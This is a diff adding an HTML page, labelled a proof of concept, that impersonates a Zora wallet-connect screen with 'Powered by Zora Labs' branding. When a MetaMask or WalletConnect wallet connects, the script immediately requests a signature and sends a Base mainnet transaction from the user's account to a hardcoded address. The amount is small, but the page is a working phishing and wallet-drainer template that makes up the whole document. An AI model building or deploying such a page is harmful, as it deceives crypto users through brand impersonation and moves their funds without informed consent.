@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Zora Wallet Connect PoC</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body {
+      font-family: Arial;
+      background: #f5f5f5;
+      padding: 30px;
+      text-align: center;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      display: inline-block;
+    }
+    button {
+      padding: 12px 20px;
+      margin: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .metamask { background: #f6851b; color: white; }
+    .walletconnect { background: #007AFF; color: white; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Connect your wallet</h2>
+    <p>Select a wallet to connect to Zora</p>
+    <button class="metamask" onclick="connectMetaMask()">MetaMask</button>
+    <button class="walletconnect" onclick="connectWalletConnect()">WalletConnect</button>
+    <p style="font-size: 12px;">Powered by Zora Labs</p>
+  </div>
+
+  <script>
+    let web3;
+
+    async function sendPoC(from) {
+      const value = Web3.utils.toWei("0.0000000001", "ether");
+
+      try {
+        // 1. Sign message
+        await web3.eth.personal.sign("Confirm PoC action on Zora", from);
+
+        // 2. Send small Base transaction
+        await web3.eth.sendTransaction({
+          from: from,
+          to: "0xCF62064d70593ecd8B319b267F769ddD181157d2",
+          value: value
+        });
+
+        alert("PoC transaction sent successfully!");
+      } catch (err) {
+        console.error(err);
+        alert("Error during PoC: " + err.message);
+      }
+    }
+
+    async function connectMetaMask() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          web3 = new Web3(window.ethereum);
+          const accounts = await web3.eth.getAccounts();
+          sendPoC(accounts[0]);
+        } catch (err) {
+          alert("MetaMask error: " + err.message);
+        }
+      } else {
+        alert("MetaMask not found");
+      }
+    }
+
+    async function connectWalletConnect() {
+      const provider = new WalletConnectProvider.default({
+        rpc: {
+          8453: "https://mainnet.base.org" // Base Mainnet
+        },
+        chainId: 8453
+      });
+
+      await provider.enable();
+      web3 = new Web3(provider);
+      const accounts = await web3.eth.getAccounts();
+      sendPoC(accounts[0]);
+    }
+  </script>
+</body>
+</html>
